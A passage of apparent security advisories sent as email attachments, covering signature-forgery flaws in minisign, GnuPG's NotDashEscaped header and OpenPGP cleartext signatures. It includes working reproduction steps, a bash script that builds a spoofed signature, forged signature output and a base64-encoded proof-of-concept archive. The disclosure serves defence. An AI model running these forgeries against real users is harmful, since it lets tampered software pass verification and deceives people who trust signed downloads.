     sig_and_trusted_comment = xmalloc((sizeof sig_struct->sig) + trusted_comment_len);
     memcpy(sig_and_trusted_comment, sig_struct->sig, sizeof sig_struct->sig);
     memcpy(sig_and_trusted_comment + sizeof sig_struct->sig, trusted_comment, trusted_comment_len);

   Therefore, an attacker can extend a .minisig file with a ‘\r’
   character followed by any text, as long as it doesn’t contain a null
   byte

  Scenario

   Alice wants to send Bob a message. Over a trusted channel, she obtained
   and verified Bob’s public key. Mallory is an able to intercept and
   manipulate communications between Alice and Bob. Mallory’s goal is to
   manipulate the trusted comment of the signature that Alice sings her
   trusted message to Bob with.

  Detailed steps to reproduce

   Alice creates a keypair.

 minisign -G -W -p pubkey.txt -s seckey.txt <<<'[email protected]'

   Alice securely transmit pubkey.txt to Bob.

   Alice writes a message an signs it adding a trusted comment.

 echo "Hello World" > msg.txt
 minisign -S -s seckey.txt -m msg.txt -t "My trusted comment"

   Alice sends the message over an insecure channel with Bob. Mallory
   manipulates the signature file.

 cat msg.txt.minisig | sed 's/My trusted comment/My trusted comment\rtrusted comment: Another comment (that is longer)/' > msg.txt.minisig

   Bob verifies and views the signature

 $ minisign -V -p pubkey1.txt -m msg1.txt -x msg2.txt.minisig
 Signature and comment signature verified
 Trusted comment: My trusted comment
 $ cat msg.txt.minisig
 untrusted comment: signature from minisign secret key
 RUSxMpCG+YFr0SRuYCpobKKB63izdUb7DqzC6TnSZOeun/nnaW+1dGTMFTbK7BxAy9NrSkUJ1/gRWovtqyE+nK1VJG5PgjE3BgU=
 trusted comment: Another comment (that is longer)
 h5+qWjFYrr4OawWiTyj/3g2LMcNmGsIpyzSe8SNFvzd0VhPiKQCvNzAyaBr9jO+QM87y5nAAZsK0k5dQ3YwuCA==

   He might only look at the output of cat vs the output of minisign.

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="07-notdash.txt"
Content-Transfer-Encoding: 8bit

Cleartext Signature Forgery in the NotDashEscaped header implementation in GnuPG

   A vulnerability in GnuPG allows stuffing additional data in the Cleartext
   Signature Framework.

Impact

   Exploitation allows appending additional data after a valid BEGIN PGP
   SIGNED MESSAGE Armor Header Line and thereby potentially deceiving a GnuPG
   user about the actual signed data while preserving cryptographic
   integrity. This is possible for any

     * Cleartext signature that was generated using --not-dash-escaped
     * Detached signature, by converting it into a cleartext signature

Details

   GnuPG supports a command line flag --not-dash-escaped. It was introduced
   to generate cleartext signatures of messages that have leading dashes -,
   such as patch files. To support this, GnuPG decided to diverge from the
   RFC specification, and introduce a new header named “NotDashEscaped”.
   Furthermore, modern versions of the RFC explicitly state:

     Between the -----BEGIN PGP SIGNED MESSAGE----- line and the first empty
     line, the only Armor Header permitted is a well-formed Hash Armor Header
     (see Section 6.2.2.3). To reduce the risk of confusion about what has
     been signed, a verifying implementation MUST decline to validate any
     signature in a cleartext message if that message has any other Armor
     Header present in this location.

   When clearsigning a message with --not-dash-escaped GnuPG adds this line
   to the header.

   if (opt.not_dash_escaped)
     iobuf_writestr (out,
                     "NotDashEscaped: You need "GPG_NAME
                     " to verify this message" LF);

   Where GPG_NAME varries between versions.

   Crucially, the header line itself does not contribute to the signature.

   Verification header line parsing accepts any non-empty sequence of
   characters following ‘NotDashEscaped:’ up to the first \n’
   character.

         if( (hashes=parse_hash_header( line )) )
           afx->hashes |= hashes;
         else if( strlen(line) > 15 && !memcmp( line, "NotDashEscaped:", 15 ) )
           afx->not_dash_escaped = 1;

   By doing so, GnuPG disregards the security warning in their own comment
   above parse_hash_header and warnings in the RFC.

 /****************
  * check whether the armor header is valid on a signed message.
  * this is for security reasons: the header lines are not included in the
  * hash and by using some creative formatting rules, Mallory could fake
  * any text at the beginning of a document; assuming it is read with
  * a simple viewer. We only allow the Hash Header.
  */
 static int
 parse_hash_header( const char *line )

Detailed steps to reproduce

   Bob wants to download and verify an Arch Linux ISO. Over a trusted
   channel, he obtained the release signing key of the project via a trusted
   channel. He imports and trust it. Over an untrusted channel, on which
   Mallory has an MITM role, Bob proceeds to download the ISO file alongside
   the cryptographic signatures. Mallory converts the detached signature to a
   cleartext signature, and adds a NotDashEscaped, alongside non-standard
   line breaks. Having the hash of his download be part of the signed texts,
   Bob trusts and runs the malicous ISO.

 #!/usr/bin/env bash
 # needs curl, gpg, sq (sequoia-sq)
 FILE=$(curl -s https://mirrors.sonic.net/archlinux/images/latest/ | sed -E 's%.*href="(.*cloudimg-.*qcow2)".*|.*%\1%' | xargs)
 curl -sO https://mirrors.sonic.net/archlinux/images/latest/$FILE.SHA256
 curl -sO https://mirrors.sonic.net/archlinux/images/latest/$FILE.SHA256.sig

 echo malicious > ${FILE/cloudimg/basic}

 (
 cat <<EOF
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512
 NotDashEscaped: true%i
 %
 $(sha256sum ${FILE/cloudimg/basic})

 $(cat *.SHA256)
 $(cat *.SHA256.sig | sq packet join)
 EOF
 ) | sed -z 's/%i/%0%v%v%r%r%/g;s/%0/./g;s/%\n//g;s/%v/./g;s/%r/\r/g' | tee spoofed.sig
 curl -s https://gitlab.archlinux.org/archlinux/arch-boxes/-/raw/master/README.md | gpg --import 2>/dev/null
 gpg --verify spoofed.sig

Discussion

   Due to GnuPG handling end-of-line canonicalization differently when used
   with --not-dash-escaped not all clearsigned messages can be stuffed by
   just adding the header + injected text. However, practical exploitation
   scenarios include, but are not necessary limited to, (1) converting a
   detached signature into a cleartext signature or (2) modifying a cleartext
   signature that already contains the “NotDashEscaped” header. There is
   an additional constraint of the injected text not pros an ‘\n’
   character. Therefore, when parsing a mallicious file with a 3rd party
   downstream tool, such as some implementations of the sha512sum utility, it
   may catch the injection.

Recommendation

   Removal of the Cleartext Signature Framework from the OpenPGP standard
   helps resolve the issues with the Cleartext Signature Framework.
   Furthermore, deprecation allows for a graceful phase-out.

   OpenPGP users should avoid using cleartext signatures, as is also
   recommended by GnuPG.

   GnuPG should implement the signature validation constraints from the RFC
   to mitigate the issues with the Cleartext Signature Framework.

   To prevent confusion about the actual signed data, OpenPGP implementations
   should output the data bound by the signature during validation by
   default. sequoia-sq does so. GnuPG does not and requires the --output
   option to be set.

   When working with OpenPGP signatures in general, users should instruct
   their PGP implementation to output the signed data and only use this
   output for any further or related tasks.

References

   Visible links
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line
   . https://github.com/gpg/gnupg/blob/be77c0553203fa7f0de4a6db9a33fbd7d099f591/g10/ChangeLog-2011#L10745-L10749
   . https://datatracker.ietf.org/doc/html/rfc2440#section-7
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-7.1-5
   . https://gitlab.archlinux.org/archlinux/arch-boxes
   . https://github.com/gpg/gnupg/blob/b1857a2836c9a91ef4e359ef7ba949b54c77219d/g10/armor.c#L754-L784
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="08-notsoclear.txt"
Content-Transfer-Encoding: 8bit

     OpenPGP Cleartext Signature Framework Susceptible to Format Confusion

   An attacker can exploit ambiguous OpenPGP format syntax to deceive users
   into misinterpreting an ASCII-armored One-Pass Signed Message as a
   Cleartext Signature Framework message through a malformed header.

Impact

   This format confusion enables substitution of the original signed data
   with malicious content while retaining a seemingly valid cryptographic
   verification. Users and automated checks may unknowingly accept altered or
   spoofed payloads as authentic, because popular PGP implementations, such
   as GnuPG, default to not explicitly displaying the actual data bound by
   the signature during validation.

   Despite documented issues with the Cleartext Signature Framework and GnuPG
   recommending against it, usage of cleartext signatures remains prevalent.

   The attack necessitates a valid OpenPGP signature applied to known, but
   non-chosen, arbitrary data.

Details

   The attack is to disguise a One-Pass Signed Message (e.g. created through
   gpg --sign) as a Cleartext Signature Framework message (gpg --clearsign)

   The RFC 9580 mandates, that a One-Pass Signed Message encompasses the
   following packets:

     * a One-Pass Signature Packet: Unprotected metadata, including:

          * Hash algorithm,
          * Public key algorithm,
          * Short key-id of the signing key.

     * a Literal Data Packet: The signed data.
     * a Signature Packet: A binding between some public key and some data.

   Any OpenPGP signature format containing a valid Signature Packet alongside
   the signed data, such as the Cleartext Signature Framework, can be
   converted to a One-Pass Signed Message through:

     * forgery of a One-Pass Signature Packet (contains no cryptographically
       protected contents), and
     * encoding of the signed data in a Literal Data Packet, and
     * copying the Signature Packet.

   Since the conversion preserves both the signed data and the signature,
   cryptographic integrity remains intact. Keying material - neither private
   nor public - is not required to conduct the conversion, and a Python
   script for this procedure is provided in the appendix as a proof of
   concept.

   The attack leverages the ambiguity of the OpenPGP Armor Header Line, which
   allows a One-Pass Signed Message to be wrapped by BEGIN PGP MESSAGE or
   BEGIN PGP SIGNATURE.

   Additionally, the OpenPGP specifically does not mandate a particular
   handling of non-whitespace characters preceding or following an
   ASCII-armored OpenPGP message.

   A recipient of an OpenPGP signature might be deceived by an adversary
   through a malformed Armor Header Line into incorrectly assuming the
   Cleartext Signature Framework was used. This allows for stuffing arbitrary
   data, that the user incorrectly believes to be signed.

   The OpenPGP specifically does not mandate a particular handling of
   non-whitespace characters preceding or following an ASCII-armored OpenPGP
   message. Common OpenPGP implementations silently discard any superfluous
   data preceding the One-Pass Signed Message including malformed Armor
   Header Lines. The One-Pass Signed Message subsequently passes
   cryptographic validation. By default GnuPG does not output the signed data
   during validation, which further helps in deceiving the user.

  Detailed steps to reproduce

    Scenario

   Alice wants to transmit a file (UwUntu.iso) to Bob. Alice wants to assert
   her authorship and prevent manipulations to the file. Alice has created an
   OpenPGP keypair and securely transferred her public key to Bob.

   Mallory is a threat actor able to intercept and manipulate communications
   between Alice and Bob. Her goal is to replace the legitimate file
   (UwUntu.iso) through her malicious one (EnterpriseLinux.iso) while
   seemingly preserving valid cryptographic verification.

   UwUntu.iso and EnterpriseLinux.iso differ in their contents and thus their
   SHA256 checksums.

   Mallory possesses neither private nor public keying material used by
   Alice.

   Mallory did not interfere with the initial key exchange between Alice and
   Bob.

    Procedure

   Alice decides to clearsign the SHA256 checksum of UwUntu.iso:

   sha256sum --status UwUntu.iso --tag | gpg --clearsign --local-user
   [email protected] --armor | tee UwUntu.iso-CHECKSUM

 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 SHA256 (UwUntu.iso) = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
 -----BEGIN PGP SIGNATURE-----

 iHUEARYKAB0WIQToHhAB/IMVCMWsfO8A2ANj0QlJcwUCaGqR4AAKCRAA2ANj0QlJ
 c0I9AP4qiHxx+D90OGDEGFcdSkjiUSD/fLhlYoVDiHhnPSzHbwEAuyUxrYYg23kA
 VHK9nCInS1fNKbWo8NiedYVOXnISOgs=
 =a6YF
 -----END PGP SIGNATURE-----

   Alice then starts transmission of UwUntu.iso and UwUntu.iso-CHECKSUM to
   Bob.

   Mallory intercepts this transmission. She then converts the Cleartext
   Signature to a One-Pass Signed Message, that she disguises as a Cleartext
   Signature:

 $ python fake-signature/main.py ./UwUntu.iso-CHECKSUM /dev/stdout
 -----BEGIN PGP SIGNED MESSAGE------
 Hash: SHA512

 <insert your message here>
 -----BEGIN PGP SIGNATURE-----

 kA0DAQoWANgDY9EJSXMBrFx0AGhqkeBTSEEyNTYgKFV3VW50dS5pc28pID0gZTNi
 MGM0NDI5OGZjMWMxNDlhZmJmNGM4OTk2ZmI5MjQyN2FlNDFlNDY0OWI5MzRjYTQ5
 NTk5MWI3ODUyYjg1NYh1BAEWCgAdFiEE6B4QAfyDFQjFrHzvANgDY9EJSXMFAmhq
 keAACgkQANgDY9EJSXNCPQD+Koh8cfg/dDhgxBhXHUpI4lEg/3y4ZWKFQ4h4Zz0s
 x28BALslMa2GINt5AFRyvZwiJ0tXzSm1qPDYnnWFTl5yEjoL
 =//2u
 -----END PGP SIGNATURE-----

   Mallory replaces <insert your message here> with the checksum tag of her
   malicious EnterpriseLinux.iso:

 -----BEGIN PGP SIGNED MESSAGE------
 Hash: SHA512

 SHA256 (UwUntu.iso) = 62545c1551bcc06a72163775203d9163f46e47930cd024b4df270afa11a57ba9
 -----BEGIN PGP SIGNATURE-----

 kA0DAQoWANgDY9EJSXMBrFx0AGhqkeBTSEEyNTYgKFV3VW50dS5pc28pID0gZTNi
 MGM0NDI5OGZjMWMxNDlhZmJmNGM4OTk2ZmI5MjQyN2FlNDFlNDY0OWI5MzRjYTQ5
 NTk5MWI3ODUyYjg1NYh1BAEWCgAdFiEE6B4QAfyDFQjFrHzvANgDY9EJSXMFAmhq
 keAACgkQANgDY9EJSXNCPQD+Koh8cfg/dDhgxBhXHUpI4lEg/3y4ZWKFQ4h4Zz0s
 x28BALslMa2GINt5AFRyvZwiJ0tXzSm1qPDYnnWFTl5yEjoL
 =//2u
 -----END PGP SIGNATURE-----

   Mallory replaces the contents of UwUntu.iso with those of
   EnterpriseLinux.iso.

   Having modified both UwUntu.iso and the signature UwUntu.iso-CHECKSUM,
   Mallory forwards the files to Bob.

   Bob verifies the signature:

 $ cat ./UwUntu.iso-CHECKSUM | gpg --verify
 gpg: Signature made Sun Jul  6 17:10:24 2025 CEST
 gpg:                using EDDSA key E81E1001FC831508C5AC7CEF00D80363D1094973
 gpg: Good signature from "Alice <[email protected]>" [ultimate]

   Confident over the legitimacy of UwUntu.iso-CHECKSUM, Bob verifies, that
   UwUntu.iso actually matches UwUntu.iso-CHECKSUM:

   sha256sum --check UwUntu.iso-CHECKSUM

 UwUntu.iso: OK

   Mallory’s attack succeeded, as she deceived Bob into believing the
   manipulated UwUntu.iso to be cryptographically signed by Alice.

   The verification process involving cleartext signatures and SHA256
   checksums is utilized by multiple well-known software distributions and
   exists beyond the scope of this theoretical example.

Recommendations

   Removal of the Cleartext Signature Framework from the OpenPGP standard
   helps resolve the issues with the Cleartext Signature Framework.
   Furthermore, deprecation allows for a graceful phase-out.

   OpenPGP users should avoid using cleartext signatures, as is also
   recommended by GnuPG.

   To prevent confusion about the actual signed data, OpenPGP implementations
   should output the data bound by the signature during validation by
   default. sequoia-sq does so. GnuPG does not and requires the --output
   option to be set.

   When working with OpenPGP signatures in general, users should instruct
   their PGP implementation to output the signed data and only use this
   output for any further or related tasks.

Credits

     * Finder credits: 49016
     * PoC & writeup: 49016, Flüpke, Sivizius, Liam

Appendix

  fake-signature.tar.xz.b64

 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
